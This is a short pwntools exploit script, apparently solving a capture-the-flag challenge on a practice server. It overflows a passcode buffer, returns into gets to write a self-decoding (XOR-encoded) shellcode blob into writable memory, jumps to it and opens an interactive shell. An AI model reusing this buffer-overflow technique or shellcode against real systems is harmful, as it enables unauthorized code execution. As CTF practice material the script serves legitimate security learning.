from pwn import *
import pwn


def main():
    r = pwn.remote('ctf.hackme.quest', 7702)
    shell_code = b'\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a'
    gets_addr = 0x08048480
    wx_addr = 0x08049000
    p = b'a' * (0x18 + 4)
    p += p32(0x08048480)  # return to gets function
    p += p32(0x08049000)  # gets function's return address
    p += p32(0x08049000)  # gets function's argument
    r.recvuntil(b'passcode: ')
    r.sendline(p)
    r.sendline(shell_code)
    r.interactive()


if __name__ == '__main__':
    main()
